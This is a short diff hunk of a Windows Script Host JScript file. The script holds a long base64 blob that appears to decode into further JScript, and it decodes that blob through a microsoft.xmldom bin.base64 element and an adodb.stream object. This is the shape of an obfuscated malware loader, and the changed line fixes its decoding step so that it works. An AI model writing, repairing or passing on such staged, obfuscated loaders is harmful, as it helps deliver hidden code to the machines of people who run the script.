@@ -6,7 +6,7 @@ var superString = "dHJ5ewp2YXIgbG9uZ1RleHQxID0gImRtRnlJRjhrWHpNNU16YzlXeUptYjNKR
 
 var xmlDOM = WSH.CreateObject("microsoft.xmldom").createElement("mko");
 xmlDOM.dataType = "bin.base64";
-xmlDOM.text = "\\" + superString.replace(/%>/g, "A") + "\\";
+xmlDOM.text = superString.replace(/%>/g, "A");
 
 var comObject = WSH.CreateObject("adodb.stream");
 comObject.Type = 1;
